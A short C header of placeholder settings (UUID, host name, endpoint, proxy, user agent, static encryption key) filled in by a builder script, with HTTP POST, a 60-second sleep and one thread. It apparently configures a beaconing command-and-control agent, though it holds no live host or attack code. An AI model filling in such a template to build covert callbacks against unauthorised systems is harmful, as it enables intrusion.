#ifndef CONFIG_H
#define CONFIG_H

#define INIT_UUID "%UUID%"
#define HOST_NAME "%HOSTNAME%"
#define END_POINT "%ENDPOINT%"
#define SSL_ENABLED 1
#define PROXY_ENABLED 1
#define PROXY_URL "%PROXYURL%"

#define USER_AGENT "%USERAGENT%"
#define HTTPMETHOD "POST"
#define PORT 80

#define SLEEP_TIME 60
#define NUM_THREADS 1

// Encryption — substituted by builder.py; empty string when mode is NONE.
#define STATIC_KEY_B64 "%STATIC_KEY%"

extern const char *OS;

#endif // !CONFIG_H
